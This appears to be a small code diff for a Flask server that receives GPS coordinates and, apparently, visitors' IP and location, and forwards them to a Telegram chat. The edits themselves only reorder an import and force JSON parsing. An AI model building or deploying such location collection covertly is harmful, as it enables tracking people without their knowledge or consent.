@@ -1,9 +1,9 @@
 from flask import Flask, request, send_file
 import requests
+import os
 
 app = Flask(__name__)
 
-import os
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 CHAT_ID = os.getenv('CHAT_ID')
 
@@ -33,7 +33,7 @@ def send_to_telegram(ip, location):
 @app.route('/gps', methods=['POST'])
 def get_gps():
     try:
-        data = request.get_json()
+        data = request.get_json(force=True)
         lat = data.get('lat')
         lon = data.get('lon')
 
